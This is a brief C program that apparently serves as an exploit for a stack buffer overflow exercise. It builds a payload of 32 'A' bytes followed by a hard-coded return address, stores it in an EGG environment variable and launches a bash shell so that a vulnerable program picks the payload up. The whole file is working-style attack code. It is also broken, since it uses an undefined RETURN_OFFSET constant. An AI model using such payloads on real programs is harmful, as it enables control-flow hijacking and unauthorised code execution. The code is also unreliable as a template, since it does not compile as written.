#include <stdlib.h>
#include <stdio.h>

#define OFFSET 32

int main(int argc, char* argv[]) {
    char buff[OFFSET + 5];

    int i = 0;
    for (i = 0; i < OFFSET; i++) {
        buff[i] = 'A';
    }

    // 0x080485a4
    buff[RETURN_OFFSET] = 0xa4;
    buff[RETURN_OFFSET + 1] = 0x85;
    buff[RETURN_OFFSET + 2] = 0x04;
    buff[RETURN_OFFSET + 3] = 0x08;
    buff[RETURN_OFFSET + 4] = '\0';

    char eggStr[150];
    sprintf(eggStr,"EGG=%s", buff);
    putenv(eggStr);
    system("/bin/bash");

    return 0;
}
